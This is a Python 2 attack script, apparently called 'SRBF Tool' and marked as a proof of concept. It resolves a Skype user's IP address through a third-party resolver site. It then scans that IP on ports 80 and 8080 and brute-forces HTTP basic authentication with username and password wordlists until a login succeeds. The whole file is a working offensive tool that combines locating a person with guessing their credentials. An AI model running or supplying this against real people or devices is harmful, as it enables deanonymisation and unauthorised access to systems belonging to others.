import requests
import socket
import os

green = '\033[1;32m'
red = '\033[1;31m'
blue = '\033[1;34m'
endc = '\033[1;m'

def main():
	banner()
	ip = skype()
	port_check(ip)

def banner():
	os.system('clear')
	print blue+'[+] - SRBF Tool - [+]'
	print '[+] - Develped by The_Gambler - [+]'
	print '[+] - facebook.com/mthbernardes - [+]'
	print '[+] - github.com/mthbernardes - [+]'
	print '[+] - PROOF OF CONCEPT - [+]'+endc
	print

def skype():
	try:
		payload = {'skype':'','resolveSkype':''}
		payload['skype'] = raw_input('[+] - Provide the skype Username: ')
		print '[+] - Trying to find IP address...'
		r = requests.post('http://www.skresolver.com/index.php', data=payload)
		lines = r.text
		if lines.find("Avatar") == -1:
			print red+"[+] - IP Address not Founded"+endc
		else:
			post = lines.find("Avatar")
			ip = lines[post:-1].split()[0]
			ip = ip.split('>')[3].split(':')[0]
			print green+"[+] - IP Address founded "+ip+endc
		return ip
	except:
		print
		print red+'[+] - Error - [+]'+endc
		print red+'[+] - Exiting - [+]'+endc
		exit()
		
def port_check(ip):
	print '[+] - Scanning for http open port...'
	for port in (80,8080):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(1)
		conn = s.connect_ex((ip,port))
		if conn == 0:
			print green+'[+] - Port',port,'is open'+endc
			single(ip,port)
		else:
			print red+'[+] - Port',port,'is closed'+endc

def single(ip,port):
	port = str(port)
	r = raw_input('[+] - Do you want to use default user/password file?(y/n)')
	if r == 'y':
		senha_f	= open('wordlist/c_password.txt','r')
		usuario_f= open('wordlist/c_user.txt','r')
		senha_r	= senha_f.read().splitlines()
		usuario_r = usuario_f.read().splitlines()
	
	elif r == 'n':
		usuario_i = raw_input('Please provide the file with the username(s): ')
		senha_i = raw_input('Please provide the file with the passwords: ')
		senha_f	= open(senha_i,'r')
		usuario_f = open(usuario_i,'r')
		senha_r = senha_f.read().splitlines()
		usuario_r = usuario_f.read().splitlines()
	
	for user in usuario_r:
		for password in senha_r:
			r = requests.get('http://'+ip+':'+port, auth=(user, password))
			resp = r.status_code
			print blue+'[+] - HTTP Response ',resp
			print blue+'[+] - Executing brute force - [+]'+endc
			print blue+'[+] - User: '+user+endc
			print blue+'[+] - Password: '+password+endc
			print
			if resp == 200:
				print green+'[+] - LOGIN FOUNDED'+endc
				print green+'[+] - HTTP Response ',resp,endc
				print green+'[+] - User: '+user+endc
				print green+'[+] - Password: '+password+endc
				print
				exit()

main()
